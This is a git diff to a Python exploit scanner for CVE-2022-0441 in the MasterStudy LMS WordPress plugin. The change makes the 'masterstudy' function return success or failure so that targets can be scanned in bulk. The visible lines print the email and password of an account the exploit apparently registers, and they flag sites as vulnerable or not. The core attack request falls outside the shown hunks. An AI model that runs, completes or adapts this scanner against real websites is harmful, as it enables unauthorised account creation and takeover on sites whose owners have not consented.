@@ -12,7 +12,6 @@ init(autoreset=True)
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 def masterstudy(profile_url, timeout=5):
-
     session = requests.Session()
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
@@ -47,13 +46,19 @@ def masterstudy(profile_url, timeout=5):
                 print(f"{Style.BRIGHT}{Fore.CYAN}    - Email: {user_email}")
                 print(f"{Style.BRIGHT}{Fore.CYAN}    - Password: {user_password}")
                 print(f"{Style.BRIGHT}{Fore.CYAN}    - Exploit Data: {data}")
+                return True 
             else:
                 print(f"{Style.BRIGHT}{Fore.RED}[*] {profile_url} => Exploit failed, try manual.")
+                return False 
         else:
             print(f"{Style.BRIGHT}{Fore.CYAN}[+] {profile_url} Not vulnerable (stm_lms_register not found).")
+            return False  
     except Exception as e:
         print(f"{Style.BRIGHT}{Fore.RED}[%] {profile_url} => Request failed: {e}")
+        return False  
 
 def scan_cve_2022_0441(profile_url):
-    masterstudy(profile_url)
+    success = masterstudy(profile_url)  
+    return success 
+
 
